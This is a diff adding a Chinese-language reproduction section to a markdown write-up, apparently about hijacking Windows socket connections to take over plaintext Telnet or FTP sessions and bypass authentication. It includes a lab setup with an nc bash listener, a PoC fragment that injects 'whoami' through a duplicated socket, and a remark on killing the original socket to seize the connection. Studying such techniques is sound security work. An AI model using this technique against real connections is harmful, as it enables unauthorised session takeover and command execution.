@@ -376,6 +376,34 @@ int main(int argc, char** argv)
 
 ```
 
+## 复现和思考
+
+这种技术理论上只能应用于明文传输的协议，如Telnet、ftp，劫持连接后我们通常能直接掠过身份认证的过程，这里我们起一个nc的bash控制口做一个测试。
+
+我们先在kali上起一个服务端，然后使用nc去连接。
+
+![](../.gitbook/assets/image%20%28208%29.png)
+
+![](../.gitbook/assets/image%20%28207%29.png)
+
+之后运行我们的poc，由于套接字的处理是异步的，我们需要另起一个线程去发送命令，然后使用主线程接收。
+
+```text
+DWORD WINAPI ThreadProc(LPVOID lpParam)
+{
+    Sleep(3000);
+    char msg[] = "whoami";
+    send((SOCKET)lpParam, msg, sizeof(msg), MSG_OOB);
+    return 0;
+}
+
+ HANDLE hTHread =  CreateThread(0, 0, ThreadProc, NewSocket, 0, 0);
+```
+
+可以看到主副socket都接收到了命令的结果，如果我们不想要主套接字接收到，我们可以直接挂起或者干掉它来接管这个网络连接。
+
+![](../.gitbook/assets/image%20%28209%29.png)
+
 ## LINKS
 
 原文如下:
